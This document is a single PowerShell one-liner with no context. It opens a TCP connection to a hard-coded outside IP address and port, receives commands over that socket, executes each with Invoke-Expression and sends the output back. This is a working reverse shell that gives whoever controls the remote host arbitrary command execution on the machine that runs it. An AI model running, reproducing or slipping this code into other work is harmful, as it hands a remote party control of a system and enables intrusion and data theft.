$ms = (New-Object Net.Sockets.TCPClient("147.185.221.211:13644", 13644)).GetStream(); [byte[]]$tcbt = 0..65535 | % { 0 }; while (($i = $ms.Read($tcbt, 0, $tcbt.Length)) -ne 0) { ; $d = (New-Object Text.ASCIIEncoding).GetString($tcbt, 0, $i); $st = ([text.encoding]::ASCII).GetBytes((iex $d 2>&1)); $ms.Write($st, 0, $st.Length) }